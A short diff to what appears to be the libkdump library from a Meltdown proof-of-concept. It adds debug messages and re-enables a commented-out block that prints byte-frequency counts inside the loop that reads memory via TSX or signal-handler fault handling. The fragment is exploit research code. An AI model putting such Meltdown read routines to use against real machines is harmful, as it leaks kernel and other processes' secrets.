@@ -551,25 +551,26 @@ int __attribute__((optimize("-O0"))) libkdump_read(size_t addr) {
   for (i = 0; i < config.measurements; i++) {
     if (config.fault_handling == TSX) {
       //read using TSX
+      debug(INFO, "I AM READING TSX!!!");
       r = libkdump_read_tsx();
     } else {
       //otherwise read using normal fault handling?
+      debug(INFO, "I AM READING SIGNAL HANDLER!!!");
       r = libkdump_read_signal_handler();
     }
     //populates the table with value of the character read from meltdown and flush & reload
-    debug(INFO, "res_stat[%x] in loop %d = %d\n", r, i, res_stat[r]);
     res_stat[r]++;
   }
   int max_v = 0, max_i = 0;
 
-  // if (dbg) {
-  //   for (i = 0; i < sizeof(res_stat); i++) {
-  //     if (res_stat[i] == 0)
-  //       continue;
-  //     debug(INFO, "res_stat[%x] = %d\n",
-  //           i, res_stat[i]);
-  //   }
-  // }
+  if (dbg) {
+    for (i = 0; i < sizeof(res_stat); i++) {
+      if (res_stat[i] == 0)
+        continue;
+      debug(INFO, "res_stat[%x] = %d\n",
+            i, res_stat[i]);
+    }
+  }
 
   for (i = 1; i < 256; i++) {
     if (res_stat[i] > max_v && res_stat[i] >= config.accept_after) {
